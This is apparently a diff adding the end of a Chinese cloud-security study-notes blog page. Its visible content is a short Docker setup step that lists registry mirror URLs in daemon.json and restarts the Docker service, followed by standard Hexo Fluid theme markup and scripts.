+<h4 id="配置docker的源-加速拉取镜像"><a href="#配置docker的源-加速拉取镜像" class="headerlink" title="配置docker的源(加速拉取镜像)"></a>配置docker的源(加速拉取镜像)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vi /etc/docker/daemon.json<br>&#123;<br> <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://docker.1panel.live&quot;</span>,<br><span class="hljs-string">&quot;https://hub.rat.dev&quot;</span>,<br><span class="hljs-string">&quot;https://docker.actima.top&quot;</span>,<br><span class="hljs-string">&quot;https://atomhub.openatom.cn&quot;</span>,<br><span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br><span class="hljs-string">&quot;https://docker.nastool.de&quot;</span>,<br><span class="hljs-string">&quot;https://dockerpull.org&quot;</span>,<br><span class="hljs-string">&quot;https://registry.dockermirror.com&quot;</span>,<br><span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br><span class="hljs-string">&quot;https://docker.1ms.run&quot;</span>,<br><span class="hljs-string">&quot;https://docker.aityp.com&quot;</span>,<br><span class="hljs-string">&quot;https://dockerhub.xisoul.cn&quot;</span>,<br><span class="hljs-string">&quot;https://docker.imgdb.de&quot;</span>,<br><span class="hljs-string">&quot;https://hub.littlediary.cn&quot;</span>,<br><span class="hljs-string">&quot;https://docker.unsee.tech&quot;</span>,<br><span class="hljs-string">&quot;https://hub.crdz.gq&quot;</span>,<br><span class="hljs-string">&quot;https://hub.firefly.store&quot;</span>,<br><span class="hljs-string">&quot;https://docker.kejilion.pro&quot;</span>,<br><span class="hljs-string">&quot;https://dhub.kubesre.xyz&quot;</span>,<br><span class="hljs-string">&quot;https://hub.xdark.top&quot;</span>,<br><span class="hljs-string">&quot;https://docker.udayun.com&quot;</span> <br>]<br>&#125;<br><br><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/" class="category-chain-item">云原生</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E7%AF%87/" class="print-no-link">#云服务篇</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>云安全Day3</div>
+      <div>http://example.com/2025/05/29/云安全Day3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XCDH</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>XCDH</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
